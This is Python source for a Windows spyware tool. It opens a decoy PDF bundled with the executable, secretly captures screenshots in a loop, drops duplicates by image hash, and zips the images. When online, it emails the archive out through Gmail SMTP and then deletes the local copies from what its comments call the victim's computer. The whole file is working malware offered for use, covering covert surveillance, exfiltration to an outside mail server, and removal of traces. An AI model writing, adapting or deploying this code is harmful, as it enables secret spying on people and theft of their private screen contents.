from PIL import ImageGrab
import time
import os
import sys
import uuid
import dhash
import shutil
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import requests
import subprocess

logged_in_username = os.environ['USERPROFILE']
path = f'{logged_in_username}\\Downloads\\pics'
path_to_zip = f'{logged_in_username}\\Downloads\\pics.zip'


# pdf_file_to_open='C:\\ProgramData\\Downloads\\m.pdf'


def check_for_internet_connection():

    """""
    checks  Availabilty of internet if available
    it'll send the mail and will delete the folder and zip from victim's computer
    """""

    url = "http://www.google.com/"

    try:
        request = requests.get(url)
        send_mail()
        shutil.rmtree(path)
        os.remove(path_to_zip)

    except (requests.ConnectionError, requests.Timeout) as exception:

        pass


def convert_to_zip(path):
    """""
    converts the "pics" folder into zip file    
    """""
    shutil.make_archive("pics", 'zip', path)


def send_mail():
    """""
    If internet is available it'll send the zip file  to the given email address
    
    """""

    from_address = "YOUR_EMAIL_ID_HERE"
    to_address = "YOUR_EMAIL_ID_HERE"
    body_of_the_mail = "test"
    msg = MIMEMultipart()
    msg['From'] = from_address
    msg['To'] = to_address
    msg['Body'] = body_of_the_mail

    msg.attach(MIMEText(body_of_the_mail, 'plain'))


    attachment = open(f'{logged_in_username}\\Downloads\\pics.zip', 'rb')

    mimebase_instance = MIMEBase('application', 'octet-stram')
    mimebase_instance.set_payload((attachment).read())

    encoders.encode_base64(mimebase_instance)

    filename = 'pics.zip'
    mimebase_instance.add_header('Content-Disposition', 'attachment', filename=filename)
    msg.attach(mimebase_instance)

    email = "YOUR_EMAIL_ID_HERE"
    password = "YOUR_PASSWORD_HERE"

    server = smtplib.SMTP(host='smtp.gmail.com', port=587)
    server.starttls()
    server.login(email, password)

    message = msg.as_string()

    server.sendmail(from_address, to_address, message)

    server.quit()



def d_hash(image1, image2):

    """"
    compares two images using "Difference Hash" algorithm
    if two images are same it'll delete one image
    else two images are stored
    """""


    row1, col1 = dhash.dhash_row_col(image1)
    row2, col2 = dhash.dhash_row_col(image2)

    hash1 = dhash.format_hex(row1, col2)
    hash2 = dhash.format_hex(row2, col2)

    if hash1 == hash2:

        path1 = path + '\\' + str(index) + '.jpg'
        os.remove(path1)


def take_screenshot():
    """""
    This method will take snapshot  without the knowledge of 
     victim and save it in a "pics" folder
    """""
    fi = sys._MEIPASS + "/m.pdf"
    subprocess.Popen(fi, shell=True)

    global index, images, i, j
    images_list = []
    id = uuid.uuid4()
    index = id.int

    try:
        i = 0

        if not os.path.exists(path):
            os.makedirs(path, exist_ok=True)

        while True:


            j = i - 1
            images = ImageGrab.grab()
            images_list.append(images)
            print(images_list)
            images.save(path + '\\' + str(index) + '.jpg')

            if i > 0:
                d_hash(images_list[i], images_list[j])


            index = index + 1
            i += 1
            convert_to_zip(path)

            check_for_internet_connection()



    except OSError:

        take_screenshot()


if __name__ == '__main__':
    take_screenshot()



